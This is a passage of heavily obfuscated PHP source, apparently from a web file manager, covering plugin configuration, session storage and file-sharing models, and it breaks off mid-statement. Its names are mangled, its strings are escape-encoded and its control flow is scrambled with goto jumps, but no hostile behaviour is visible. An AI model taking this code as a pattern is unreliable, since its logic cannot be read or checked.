$d‹â•ÓÎÙ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cËİÆêî† = PLUGIN_DIR . $b‘†»ƒ·Êì . $d‹â•ÓÎÙ[2198]; if (!is_array($d˜å²·¾÷) || !is_array($d˜å²·¾÷[$d‹â•ÓÎÙ[2196]]) || !is_file($cËİÆêî†) || $d˜å²·¾÷[$d‹â•ÓÎÙ[702]] != 1) { return !1; } if ($EÈÈåœ‘ßÜ && !Action($d‹â•ÓÎÙ[2199])->checkAuth($b‘†»ƒ·Êì)) { return !1; } return !0; } public function unInstall($d”¤ºáèÇ¿) { $bá°‚ğ“ç† =& $_SERVER[¶ªÕß‚ØÁŸ]; $bàºèàêè’ = $this->loadList($d”¤ºáèÇ¿); if (file_exists(PLUGIN_DIR . $d”¤ºáèÇ¿)) { Hook::apply($d”¤ºáèÇ¿ . $bá°‚ğ“ç†[2200]); } $this->remove($bàºèàêè’[$bá°‚ğ“ç†[375]]); } public function changeStatus($a©¯×¶Šñ, $Då‰‡ìšø«) { $eÊ¼¬ó¸éî =& $_SERVER[¶ªÕß‚ØÁŸ]; $föæİíŸÌŠ = $this->loadList($a©¯×¶Šñ); if ($Då‰‡ìšø«) { Hook::apply($a©¯×¶Šñ . $eÊ¼¬ó¸éî[2201]); } $this->update($föæİíŸÌŠ[$eÊ¼¬ó¸éî[375]], array($eÊ¼¬ó¸éî[2202] => $Då‰‡ìšø«)); } public function appRegist($AÚÎ°†Ò™¥, $Eø½ê´¹Ù¶) { $Fá«´‡˜äÆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F·Ù²¸âÌ„ = $this->loadList($AÚÎ°†Ò™¥); if ($F·Ù²¸âÌ„) { $this->update($F·Ù²¸âÌ„[$Fá«´‡˜äÆ[375]], array($Fá«´‡˜äÆ[2196] => $Eø½ê´¹Ù¶)); } else { $C¹Ò„ŒÛß’ = array($Fá«´‡˜äÆ[28] => $AÚÎ°†Ò™¥, $Fá«´‡˜äÆ[2196] => $Eø½ê´¹Ù¶, $Fá«´‡˜äÆ[702] => 0, $Fá«´‡˜äÆ[6] => $this->getConfigDefault($AÚÎ°†Ò™¥)); $this->insert($C¹Ò„ŒÛß’); } } public function getConfigDefault($A„“ëÚ¸Í) { $bƒõºÊº¤½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DµÓåïÜ†  = array(); $eéø±Õ¾œ = $this->getPackageJson($A„“ëÚ¸Í); if (!$eéø±Õ¾œ && is_array($eéø±Õ¾œ[$bƒõºÊº¤½[2203]])) { return $DµÓåïÜ† ; } foreach ($eéø±Õ¾œ[$bƒõºÊº¤½[2203]] as $eµ‰ïõêÏŞ => $D±Ñ°¹…‡) { if (!isset($D±Ñ°¹…‡[$bƒõºÊº¤½[368]]) || isset($DµÓåïÜ† [$eµ‰ïõêÏŞ])) { continue; } $DµÓåïÜ† [$eµ‰ïõêÏŞ] = $D±Ñ°¹…‡[$bƒõºÊº¤½[368]]; } return $DµÓåïÜ† ; } public function getPackageJson($Eó†í„§œÏ) { return Hook::apply($Eó†í„§œÏ . $_SERVER[¶ªÕß‚ØÁŸ][2204]); } public function getConfig($cÉ¨öº¿ÌÀ, $B¶ç¼Ñ¶ƒš = false) { $AÏÍŸ¡ëå‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $BŒùÈòã¡Ş = array(); $f§±¯Ûáà = $this->loadList($cÉ¨öº¿ÌÀ); if ($f§±¯Ûáà && is_array($f§±¯Ûáà[$AÏÍŸ¡ëå‚[6]])) { $BŒùÈòã¡Ş = $f§±¯Ûáà[$AÏÍŸ¡ëå‚[6]]; } if (!$BŒùÈòã¡Ş || $B¶ç¼Ñ¶ƒš) { $BŒùÈòã¡Ş = $this->getConfigDefault($cÉ¨öº¿ÌÀ); } return $BŒùÈòã¡Ş; } public function setConfig($eœİŠ„¸İ‡, $FÄ±Æ¡œÉ = false) { goto cŸö¢·èòæ; cŸö¢·èòæ: $a‚œ†ø¤Ÿí =& $_SERVER[¶ªÕß‚ØÁŸ]; $D‚Û÷·¥Î = $this->loadList($eœİŠ„¸İ‡); if (!$D‚Û÷·¥Î) { return !1; } goto Dôëã‘›àÔ; Dôëã‘›àÔ: $E·êå¿ÛÏ‡ = $D‚Û÷·¥Î[$a‚œ†ø¤Ÿí[6]]; if ($FÄ±Æ¡œÉ == !1) { $E·êå¿ÛÏ‡ = array(); $FÄ±Æ¡œÉ = $this->getConfigDefault($eœİŠ„¸İ‡); } foreach ($FÄ±Æ¡œÉ as $F®ôŠŒŒ => $CĞÕôíÊå) { $E·êå¿ÛÏ‡[$F®ôŠŒŒ] = is_string($CĞÕôíÊå) ? trim($CĞÕôíÊå) : $CĞÕôíÊå; } goto a³í±È¾”Ë; a³í±È¾”Ë: $this->update($D‚Û÷·¥Î[$a‚œ†ø¤Ÿí[375]], array($a‚œ†ø¤Ÿí[6] => $E·êå¿ÛÏ‡)); goto Dî¬Ï‡ÏÁ¶; Dî¬Ï‡ÏÁ¶: } public function viewList() { goto F¨ßá«©Ûß; cÍĞ«ªâÕ: $Eô ôÎãóà = $this->loadPluginList(); $F­¿©Ïôéƒ = array(); foreach ($Eô ôÎãóà as $D”›ÛŞÑÉë => $AŞ¿µïá¹ò) { unset($AŞ¿µïá¹ò[$C‰îÊª¦[2196]], $AŞ¿µïá¹ò[$C‰îÊª¦[6]]); $F÷ŸÓÜËĞ“ = PLUGIN_DIR . $AŞ¿µïá¹ò[$C‰îÊª¦[28]] . $C‰îÊª¦[2198]; if (!is_file($F÷ŸÓÜËĞ“)) { continue; } $DèõğÑ°ç = Hook::apply($AŞ¿µïá¹ò[$C‰îÊª¦[28]] . $C‰îÊª¦[2204]); if (is_array($DèõğÑ°ç)) { $F­¿©Ïôéƒ[$D”›ÛŞÑÉë] = array_merge($AŞ¿µïá¹ò, $DèõğÑ°ç); } } goto F«Û½Ø©×¤; F¨ßá«©Ûß: $C‰îÊª¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eô ôÎãóà = $this->loadList(); $this->pluginScan($Eô ôÎãóà); goto cÍĞ«ªâÕ; F«Û½Ø©×¤: return $F­¿©Ïôéƒ; goto bÁ÷èºŒŞ; bÁ÷èºŒŞ: } private function loadPluginList() { $eÅå‡ÀÚ‡ë =& $_SERVER[¶ªÕß‚ØÁŸ]; $fÛ±ìù£Ş­ = $this->loadList(); if (strtolower(MOD) == $eÅå‡ÀÚ‡ë[2205]) { return $fÛ±ìù£Ş­; } $f®§¯ß“¼… = Hook::trigger($eÅå‡ÀÚ‡ë[2206], $fÛ±ìù£Ş­); if ($fÛ±ìù£Ş­ && !$f®§¯ß“¼…) { die; } return $f®§¯ß“¼… ? $f®§¯ß“¼… : $fÛ±ìù£Ş­; } private function pluginScan($Báº“ÎçÁÜ) { $f÷”†„¡¢ =& $_SERVER[¶ªÕß‚ØÁŸ]; recursion_dir(PLUGIN_DIR, $fƒÏŒ‹÷ç, $Fš‡åØÃ¡÷, 0); foreach ($fƒÏŒ‹÷ç as $BÒ¬ŞÛ³ƒ±) { $A•²Ğ“®¡ = get_path_this($BÒ¬ŞÛ³ƒ±); if (isset($Báº“ÎçÁÜ[$A•²Ğ“®¡]) || !file_exists($BÒ¬ŞÛ³ƒ± . $f÷”†„¡¢[2207]) || !file_exists($BÒ¬ŞÛ³ƒ± . $f÷”†„¡¢[2198])) { continue; } Hook::apply($A•²Ğ“®¡ . $f÷”†„¡¢[2201]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\145\155\x5f\163\145\163\163\x69\157\x6e"; public function get($C‘¥ùÙ) { $fˆ÷ñ¹Ó³ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÆ†­ô¡«³ = $this->where(array($fˆ÷ñ¹Ó³[2208] => $C‘¥ùÙ))->find(); if (!is_array($aÆ†­ô¡«³)) { return !1; } return $aÆ†­ô¡«³[$fˆ÷ñ¹Ó³[705]]; } public function set($Eˆóå–ß‹Ø, $Fïø²ï²Ãâ, $c‡ØÍóİ˜È = 3600) { $D³Š¼‚¨Ï =& $_SERVER[¶ªÕß‚ØÁŸ]; $CÛáßñŸŸï = array($D³Š¼‚¨Ï[2208] => $Eˆóå–ß‹Ø, $D³Š¼‚¨Ï[2137] => $Fïø²ï²Ãâ, $D³Š¼‚¨Ï[2209] => $c‡ØÍóİ˜È + time()); if (Session::get($D³Š¼‚¨Ï[2210])) { $CÛáßñŸŸï[$D³Š¼‚¨Ï[1440]] = Session::get($D³Š¼‚¨Ï[2210]); } else { $CÛáßñŸŸï[$D³Š¼‚¨Ï[1440]] = 0; } if ($this->get($Eˆóå–ß‹Ø)) { return $this->where(array($D³Š¼‚¨Ï[2208] => $Eˆóå–ß‹Ø))->save($CÛáßñŸŸï); } else { return $this->add($CÛáßñŸŸï, array(), !0); } } public function remove($fÃ“†àù¹ƒ) { return $this->where(array($_SERVER[¶ªÕß‚ØÁŸ][2208] => $fÃ“†àù¹ƒ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¶ªÕß‚ØÁŸ][2211] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\155\145", "\x74\151\x6d\145", "\x69\x6e\x73\145\162\164\54\165\160\x64\x61\164\145", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\143\162\145\x61\164\145\124\151\x6d\145", "\x74\151\155\145", "\151\156\x73\145\162\x74", "\146\x75\156\143\x74\x69\x6f\156"), array("\157\160\164\151\x6f\x6e\163", '', "\151\x6e\163\x65\x72\164\54\x75\160\144\x61\x74\x65\54\x73\145\x6c\x65\143\x74", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($E‹è’Å½Æ) { $F¢ùëõ÷½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cºŞ‹æÆ©— = isset($E‹è’Å½Æ[0]) ? $E‹è’Å½Æ[0] : !1; return array($F¢ùëõ÷½[2212] => array(USER_ID, $F¢ùëõ÷½[2213]), $F¢ùëõ÷½[2175] => array($cºŞ‹æÆ©—, $F¢ùëõ÷½[2214])); } protected function listSimple() { $A˜›¸©ˆºì = array($_SERVER[¶ªÕß‚ØÁŸ][1440] => USER_ID); $eŠË…Ä‡¡Â = $this->field($this->fieldList)->where($A˜›¸©ˆºì)->select(); return $eŠË…Ä‡¡Â ? $eŠË…Ä‡¡Â : array(); } protected function getInfo($Eê†§Ò‹‘, $E¬¬‚¸”™ = false) { $F®œ…ÜÙ¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($E¬¬‚¸”™) { return $this->_getShareInfo(array($F®œ…ÜÙ¬[449] => $Eê†§Ò‹‘)); } $bÚÈº³„òİ = $this->cacheFunctionGet($F®œ…ÜÙ¬[2215], $Eê†§Ò‹‘); return $bÚÈº³„òİ; } public function getInfoByHash($cèÑÌàÀŠŒ) { return $this->_getShareInfo(array($_SERVER[¶ªÕß‚ØÁŸ][451] => $cèÑÌàÀŠŒ)); } public function getInfoByPath($A¤½¶ó·¾) { $D™ò‰ï§Œƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $añø÷ÍÑæ = array($D™ò‰ï§Œƒ[1440] => USER_ID, $D™ò‰ï§Œƒ[377] => $A¤½¶ó·¾); return $this->_getShareInfo($añø÷ÍÑæ); } public function getInfoBySourcePath($E¶’¬ƒŞ’¦) { $dîÎ¿á–îË =& $_SERVER[¶ªÕß‚ØÁŸ]; $FóÉëíéöÒ = array($dîÎ¿á–îË[1440] => USER_ID, $dîÎ¿á–îË[1022] => $E¶’¬ƒŞ’¦); return $this->_getShareInfo($FóÉëíéöÒ); } private function _getShareInfo($cßˆ™Ïèî ) { goto a•¦õ”ÓÔï; E´¹ÃÛ‡Ğ—: $cßˆ™Ïèî  = array($a®“¹§†[449] => $eæšçíÆéÉ[$a®“¹§†[449]]); $D¬ÛÍÈÄ¯ø = $a®“¹§†[2216]; $dèÆ¨È²æ‚ = Model($a®“¹§†[545])->order($a®“¹§†[375])->field($D¬ÛÍÈÄ¯ø)->where($cßˆ™Ïèî )->select(); goto dÔí„Ş‡åİ; a•¦õ”ÓÔï: $a®“¹§† =& $_SERVER[¶ªÕß‚ØÁŸ]; $eæšçíÆéÉ = $this->where($cßˆ™Ïèî )->find(); if (!$eæšçíÆéÉ) { return !1; } goto E´¹ÃÛ‡Ğ—; dÔí„Ş‡åİ: if ($eæšçíÆéÉ[$a®“¹§†[377]] == $a®“¹§†[476]) { $eæšçíÆéÉ[$a®“¹§†[399]] = IO::info($eæšçíÆéÉ[$a®“¹§†[1022]]); } else { $eæšçíÆéÉ[$a®“¹§†[399]] = Model($a®“¹§†[1121])->pathInfo($eæšçíÆéÉ[$a®“¹§†[377]]); } $eæšçíÆéÉ[$a®“¹§†[2217]] = $dèÆ¨È²æ‚; return $eæšçíÆéÉ; goto c§È¿Î®»Â; c§È¿Î®»Â: } protected function getInfoAuth($cÊ·ãçã) { $f…ŒƒóËÃ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d‹·–Ç‘Äá = $this->getInfo($cÊ·ãçã); $d‹·–Ç‘Äá[$f…ŒƒóËÃ[384]] = Model($f…ŒƒóËÃ[462])->authMake($d‹·–Ç‘Äá[$f…ŒƒóËÃ[2217]]); return $d‹·–Ç‘Äá; } protected function listData($FõÛÓÏÄ· = null, $dæÄ»™ï–ô = 300) { $Cåê¿›‘Ú‰ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Déè˜ç¾àó = array(array($Cåê¿›‘Ú‰[454] => array($Cåê¿›‘Ú‰[932], 0), $Cåê¿›‘Ú‰[456] => array($Cåê¿›‘Ú‰[932], 0), $Cåê¿›‘Ú‰[2218] => $Cåê¿›‘Ú‰[2187])); if ($FõÛÓÏÄ· == $Cåê¿›‘Ú‰[1874]) { $Déè˜ç¾àó = array($Cåê¿›‘Ú‰[454] => 1); } else { if ($FõÛÓÏÄ· == $Cåê¿›‘Ú‰[1011]) { $Déè˜ç¾àó = array($Cåê¿›‘Ú‰[456] => 1); } } $Déè˜ç¾àó[$Cåê¿›‘Ú‰[1440]] = USER_ID; $FÙªôÍÈñ = $this->where($Déè˜ç¾àó)->selectPage($dæÄ»™ï–ô); return $FÙªôÍÈñ; } protected function listToMe($b…÷ñäÃ = 300) { goto Dìİ³éŞÎô; e‹«”Ğ‘Ù: $dœš••„ÌÓ = array($DÖÈÊù”ø¨[2221] => $cªŠ¿ŞˆÛ, $DÖÈÊù”ø¨[2222] => $b›Š‚«Ê è[$DÖÈÊù”ø¨[360]]); return $dœš••„ÌÓ; goto dã£‚áîÎî; F´İ§çÆš: $eŠØèõôµ¸ = array($DÖÈÊù”ø¨[529] => SourceModel::TYPE_USER, $DÖÈÊù”ø¨[464] => USER_ID); if ($BÇæµ¾¥‚”) { $eŠØèõôµ¸ = array(array($DÖÈÊù”ø¨[529] => SourceModel::TYPE_USER, $DÖÈÊù”ø¨[464] => USER_ID), array($DÖÈÊù”ø¨[529] => SourceModel::TYPE_GROUP, $DÖÈÊù”ø¨[464] => array($DÖÈÊù”ø¨[7], $BÇæµ¾¥‚”)), $DÖÈÊù”ø¨[2218] => $DÖÈÊù”ø¨[2187]); } $b›Š‚«Ê è = Model($DÖÈÊù”ø¨[545])->where($eŠØèõôµ¸)->selectPage($b…÷ñäÃ); goto bçÊ—ãª; Dìİ³éŞÎô: $DÖÈÊù”ø¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bøò¥¸‘¬ = Session::get($DÖÈÊù”ø¨[2219]); $BÇæµ¾¥‚” = array_to_keyvalue($bøò¥¸‘¬, $DÖÈÊù”ø¨[33], $DÖÈÊù”ø¨[2107]); goto F´İ§çÆš; bçÊ—ãª: $Cš× æå = array_to_keyvalue_group($b›Š‚«Ê è[$DÖÈÊù”ø¨[363]], $DÖÈÊù”ø¨[449]); if (!$Cš× æå) { return $b›Š‚«Ê è; } $EäŒÍáë¨— = $DÖÈÊù”ø¨[2220]; goto Dºï˜Ùå­; Dºï˜Ùå­: $eŠØèõôµ¸ = array($DÖÈÊù”ø¨[449] => array($DÖÈÊù”ø¨[392], array_keys($Cš× æå))); $cªŠ¿ŞˆÛ = $this->field($EäŒÍáë¨—)->where($eŠØèõôµ¸)->select(); foreach ($cªŠ¿ŞˆÛ as $F¦Ñ¨Ü…²í => &$BËËÓÁÔä¯) { $BËËÓÁÔä¯[$DÖÈÊù”ø¨[2217]] = $Cš× æå[$BËËÓÁÔä¯[$DÖÈÊù”ø¨[449]]]; } goto e‹«”Ğ‘Ù; dã£‚áîÎî: } protected function shareAdd($BÙÁ‰æˆÚÀ, $f¸¿ÁŸñ±) { $B¶¥Æ½É– =& $_SERVER[¶ªÕß‚ØÁŸ]; $f·Ö¿³„äĞ = $this->_addShareData($BÙÁ‰æˆÚÀ, $f¸¿ÁŸñ±); if (!empty($f¸¿ÁŸñ±[$B¶¥Æ½É–[2223]])) { $this->_shareAuthSet($f·Ö¿³„äĞ, $f¸¿ÁŸñ±[$B¶¥Æ½É–[2223]]); } $this->shareEventAdd($BÙÁ‰æˆÚÀ, $f¸¿ÁŸñ±, $B¶¥Æ½É–[1014]); return $f·Ö¿³„äĞ; } private function shareEventAdd($AÒç÷…ƒÙ, $DŠƒ§ ´‘, $f‘è´ØÍÉ° = "\x61\144\144") { goto eİ¾˜®íáÒ; d³ŒíŒ¿†É: return; goto B÷İÅ©È™; D³‡ÉŒ²–‰: $c§Áâ¿‡­  = $bØ¶Å›¼¶ğ[2226]; if ($c‡ïÁÛÈ½ğ[$bØ¶Å›¼¶ğ[454]] == $bØ¶Å›¼¶ğ[476] && $DŠƒ§ ´‘[$bØ¶Å›¼¶ğ[454]] == $bØ¶Å›¼¶ğ[93]) { $c§Áâ¿‡­  = $bØ¶Å›¼¶ğ[2224]; } if ($c‡ïÁÛÈ½ğ[$bØ¶Å›¼¶ğ[454]] == $bØ¶Å›¼¶ğ[93] && $DŠƒ§ ´‘[$bØ¶Å›¼¶ğ[454]] == $bØ¶Å›¼¶ğ[476]) { $c§Áâ¿‡­  = $bØ¶Å›¼¶ğ[2227]; } goto dÌ™“†áğÊ; eİ¾˜®íáÒ: $bØ¶Å›¼¶ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($f‘è´ØÍÉ° == $bØ¶Å›¼¶ğ[1014]) { if ($DŠƒ§ ´‘[$bØ¶Å›¼¶ğ[454]] == $bØ¶Å›¼¶ğ[93]) { Model($bØ¶Å›¼¶ğ[513])->eventShare($AÒç÷…ƒÙ, $bØ¶Å›¼¶ğ[2224]); } if ($DŠƒ§ ´‘[$bØ¶Å›¼¶ğ[456]] == $bØ¶Å›¼¶ğ[93]) { Model($bØ¶Å›¼¶ğ[513])->eventShare($AÒç÷…ƒÙ, $bØ¶Å›¼¶ğ[2225]); } return; } $c‡ïÁÛÈ½ğ = $this->getInfoByPath($AÒç÷…ƒÙ); goto D³‡ÉŒ²–‰; dÌ™“†áğÊ: if ($c‡ïÁÛÈ½ğ[$bØ¶Å›¼¶ğ[456]] == $bØ¶Å›¼¶ğ[476] && $DŠƒ§ ´‘[$bØ¶Å›¼¶ğ[456]] == $bØ¶Å›¼¶ğ[93]) { $c§Áâ¿‡­  = $bØ¶Å›¼¶ğ[2225]; } if ($c‡ïÁÛÈ½ğ[$bØ¶Å›¼¶ğ[456]] == $bØ¶Å›¼¶ğ[93] && $DŠƒ§ ´‘[$bØ¶Å›¼¶ğ[456]] == $bØ¶Å›¼¶ğ[476]) { $c§Áâ¿‡­  = $bØ¶Å›¼¶ğ[2228]; } Model($bØ¶Å›¼¶ğ[513])->eventShare($AÒç÷…ƒÙ, $c§Áâ¿‡­ ); goto d³ŒíŒ¿†É; B÷İÅ©È™: } private function _addShareData($b§ìòÄ“Í­, $B´Ê³œô± = array()) { goto aÖŒñ‚ æ¿; D¨éÔ‘ñá¼: if ($AÒˆˆ®“° = $this->where($Dã†ğ‘³ßø)->find()) { return $AÒˆˆ®“°[$B¸ÈŞ‘¥Á­[449]]; } if ($b§ìòÄ“Í­ == 0) { $CÁ±óŠãÛ = array($B¸ÈŞ‘¥Á­[28] => get_path_this($B´Ê³œô±[$B¸ÈŞ‘¥Á­[85]])); } else { $CÁ±óŠãÛ = Model($B¸ÈŞ‘¥Á­[766])->sourceInfo($b§ìòÄ“Í­); if (!$CÁ±óŠãÛ) { return !1; } } if (!$B´Ê³œô±[$B¸ÈŞ‘¥Á­[1346]]) { $B´Ê³œô±[$B¸ÈŞ‘¥Á­[1346]] = $CÁ±óŠãÛ[$B¸ÈŞ‘¥Á­[28]]; } goto c­““íÆĞÁ; CºÀøÃ—†: $Dà–¾°áëÈ = $this->add($bøâ¾ŒèçÚ); $a½óòíŸ¿ = array($B¸ÈŞ‘¥Á­[451] => short_id($Dà–¾°áëÈ)); $this->where(array($B¸ÈŞ‘¥Á­[448] => $Dà–¾°áëÈ))->save($a½óòíŸ¿); goto f¶åéÄãˆò; aÖŒñ‚ æ¿: $B¸ÈŞ‘¥Á­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dã†ğ‘³ßø = array($B¸ÈŞ‘¥Á­[391] => $b§ìòÄ“Í­, $B¸ÈŞ‘¥Á­[1431] => USER_ID); if ($b§ìòÄ“Í­ == 0) { $Dã†ğ‘³ßø = array($B¸ÈŞ‘¥Á­[2229] => $B´Ê³œô±[$B¸ÈŞ‘¥Á­[1022]], $B¸ÈŞ‘¥Á­[1431] => USER_ID); } goto D¨éÔ‘ñá¼; c­““íÆĞÁ: $bøâ¾ŒèçÚ = array($B¸ÈŞ‘¥Á­[1431] => USER_ID, $B¸ÈŞ‘¥Á­[391] => $b§ìòÄ“Í­, $B¸ÈŞ‘¥Á­[1346] => $B¸ÈŞ‘¥Á­[33], $B¸ÈŞ‘¥Á­[454] => 0, $B¸ÈŞ‘¥Á­[456] => 0, $B¸ÈŞ‘¥Á­[1022] => $B¸ÈŞ‘¥Á­[33], $B¸ÈŞ‘¥Á­[304] => $B¸ÈŞ‘¥Á­[33], $B¸ÈŞ‘¥Á­[808] => $B¸ÈŞ‘¥Á­[33], $B¸ÈŞ‘¥Á­[2230] => 0, $B¸ÈŞ‘¥Á­[2231] => 0, $B¸ÈŞ‘¥Á­[716] => 0, $B¸ÈŞ‘¥Á­[2232] => $B¸ÈŞ‘¥Á­[33], $B¸ÈŞ‘¥Á­[451] => $B¸ÈŞ‘¥Á­[33]); $Fñ·ŸÅ‹‘„ = explode($B¸ÈŞ‘¥Á­[47], $B¸ÈŞ‘¥Á­[2233]); foreach ($Fñ·ŸÅ‹‘„ as $d¦¼ëò„ô) { if (!isset($B´Ê³œô±[$d¦¼ëò„ô])) { continue; } $bøâ¾ŒèçÚ[$d¦¼ëò„ô] = $B´Ê³œô±[$d¦¼ëò„ô]; } goto CºÀøÃ—†; f¶åéÄãˆò: return $Dà–¾°áëÈ; goto DÊÇìÅ¬Â; DÊÇìÅ¬Â: } private function _shareAuthSet($a÷ÒËÃãŒØ, $FŒ¯×„å°Œ) { goto c™˜°²éãÚ; c™˜°²éãÚ: $DæİÓ½éŞ’ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!is_array($FŒ¯×„å°Œ)) { return !1; } $E•óéñÃã = Model($DæİÓ½éŞ’[2234]); goto A¸…ê›İ—Ÿ; BÀ‚Çò“×”: return $E•óéñÃã->addAll($dšƒ‹¨ãóÅ, array(), !0); goto EÂ²¹›ªãÉ; A¸…ê›İ—Ÿ: $E•óéñÃã->where(array($DæİÓ½éŞ’[449] => $a÷ÒËÃãŒØ))->delete(); $dšƒ‹¨ãóÅ = array(); foreach ($FŒ¯×„å°Œ as $dš´ÎÁ§Šõ) { $c¨Ì½¸ö¶² = SourceModel::TYPE_USER; if ($dš´ÎÁ§Šõ[$DæİÓ½éŞ’[379]] == SourceModel::TYPE_GROUP) { $c¨Ì½¸ö¶² = SourceModel::TYPE_GROUP; } $C·Ä¾–âÙ = array($DæİÓ½éŞ’[449] => $a÷ÒËÃãŒØ, $DæİÓ½éŞ’[379] => $c¨Ì½¸ö¶², $DæİÓ½éŞ’[464] => intval($dš´ÎÁ§Šõ[$DæİÓ½éŞ’[464]]), $DæİÓ½éŞ’[2235] => 0, $DæİÓ½éŞ’[2236] => -1); if ($dš´ÎÁ§Šõ[$DæİÓ½éŞ’[2235]]) { $C·Ä¾–âÙ[$DæİÓ½éŞ’[2235]] = $dš´ÎÁ§Šõ[$DæİÓ½éŞ’[2235]]; } else { if ($dš´ÎÁ§Šõ[$DæİÓ½éŞ’[2236]]) { $C·Ä¾–âÙ[$DæİÓ½éŞ’[2236]] = $dš´ÎÁ§Šõ[$DæİÓ½éŞ’[2236]]; } } $dšƒ‹¨ãóÅ[] = $C·Ä¾–âÙ; } goto BÀ‚Çò“×”; EÂ²¹›ªãÉ: } public function numViewAdd($eÍØääÜ) { $a°Š©Åï•‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¶éöÍªÂ¨ = array($a°Š©Åï•‡[448] => $eÍØääÜ); $this->where($f¶éöÍªÂ¨)->setAdd($a°Š©Åï•‡[2230]); } public function numDownloadAdd($c¬³„—¡µƒ) { $D´Àïá¸â’ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÃÅ“ø†»‰ = array($D´Àïá¸â’[448] => $c¬³„—¡µƒ); $this->where($DÃÅ“ø†»‰)->setAdd($D´Àïá¸â’[2231]); } protected function shareEdit($bâ›²¶¥¡ë, $b–š§Ô·¥¡) { goto BÏÑˆ„Ò É; BÏÑˆ„Ò É: $dÆøÓ„ë =& $_SERVER[¶ªÕß‚ØÁŸ]; $fçù½”ˆ = $this->getInfo($bâ›²¶¥¡ë); if (!$fçù½”ˆ) { return !1; } goto FŞÑÑæ«è; c‹¬Î¾•ä²: if (isset($b–š§Ô·¥¡[$dÆøÓ„ë[2223]])) { $this->_shareAuthSet($bâ›²¶¥¡ë, $b–š§Ô·¥¡[$dÆøÓ„ë[2223]]); } return !0; goto EŠÙŞ°ô¡; CÖµ½¸ÛğÍ: foreach ($E‡«©Õè¢Ó as $Càæ‚¿µá„) { if (!array_key_exists($Càæ‚¿µá„, $b–š§Ô·¥¡)) { continue; } $eÙ•ªÜ×À¦[$Càæ‚¿µá„] = $b–š§Ô·¥¡[$Càæ‚¿µá„]; } $this->shareEventAdd($fçù½”ˆ[$dÆøÓ„ë[377]], $b–š§Ô·¥¡, $dÆøÓ„ë[2075]); $this->where(array($dÆøÓ„ë[448] => $bâ›²¶¥¡ë))->save($eÙ•ªÜ×À¦); goto c‹¬Î¾•ä²; FŞÑÑæ«è: $this->_checkLinkShare($b–š§Ô·¥¡, $fçù½”ˆ); $eÙ•ªÜ×À¦ = array(); $E‡«©Õè¢Ó = explode($dÆøÓ„ë[47], $dÆøÓ„ë[2237]); goto CÖµ½¸ÛğÍ; EŠÙŞ°ô¡: } private function _checkLinkShare($eĞÚëæ…˜†, $bÇÇô—ñò) { goto fÀ¹ášÍßØ; fÀ¹ášÍßØ: $fê²ÛòàÙ¹ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($eĞÚëæ…˜†[$fê²ÛòàÙ¹[454]] != $fê²ÛòàÙ¹[93]) { return; } $bÔ²Ñ©æ©Ù = $bÇÇô—ñò[$fê²ÛòàÙ¹[399]][$fê²ÛòàÙ¹[377]]; goto A• ³„¿š¼; dÎçµ¿å®: $a·º„àìˆ· = $this->shareFileMeta($d É±ĞÎ˜à[$fê²ÛòàÙ¹[427]]); if (isset($a·º„àìˆ·[$fê²ÛòàÙ¹[368]]) && $a·º„àìˆ·[$fê²ÛòàÙ¹[368]] == $fê²ÛòàÙ¹[93]) { show_json(LNG($fê²ÛòàÙ¹[2240]), !1); } goto fº‚ÑŞõÚÜ; A• ³„¿š¼: if ($bÇÇô—ñò[$fê²ÛòàÙ¹[399]][$fê²ÛòàÙ¹[29]] != $fê²ÛòàÙ¹[177]) { $e†·Ç÷‹Ñ™ = $this->_folderReport($bÔ²Ñ©æ©Ù); if (!$e†·Ç÷‹Ñ™) { return; } show_json(LNG($fê²ÛòàÙ¹[2238]) . $fê²ÛòàÙ¹[2239] . $e†·Ç÷‹Ñ™, !1); } $d É±ĞÎ˜à = Model($fê²ÛòàÙ¹[766])->fileInfoGet($bÇÇô—ñò[$fê²ÛòàÙ¹[399]][$fê²ÛòàÙ¹[377]]); if (!$d É±ĞÎ˜à) { return; } goto dÎçµ¿å®; fº‚ÑŞõÚÜ: } private function _folderReport($EÖïÇêç†¸) { goto dƒ‰ê“ÒÅÎ; aĞòöÍœòº: if (!$cô’¨œîšœ) { return !1; } $cô’¨œîšœ = array_to_keyvalue($cô’¨œîšœ, $DŠ÷”Âñ‡[33], $DŠ÷”Âñ‡[427]); $d²îåóº¹à = $DŠ÷”Âñ‡[47] . $EÖïÇêç†¸ . $DŠ÷”Âñ‡[47]; goto FéÓ×ï‡‘; dƒ‰ê“ÒÅÎ: $DŠ÷”Âñ‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $eÎÏ–ËªËÒ = array($DŠ÷”Âñ‡[427] => array($DŠ÷”Âñ‡[932], 0), $DŠ÷”Âñ‡[702] => 3); $cô’¨œîšœ = Model($DŠ÷”Âñ‡[2241])->where($eÎÏ–ËªËÒ)->field($DŠ÷”Âñ‡[427])->select(); goto aĞòöÍœòº; Bø“ëª‘ö: $BÄŒ‡ÙŸ¯ = substr($DíÔÅ·ï‹¡[$DŠ÷”Âñ‡[467]], strpos($DíÔÅ·ï‹¡[$DŠ÷”Âñ‡[467]], $d²îåóº¹à)); $eÎÏ–ËªËÒ = array($DŠ÷”Âñ‡[377] => array($DŠ÷”Âñ‡[7], trim($BÄŒ‡ÙŸ¯, 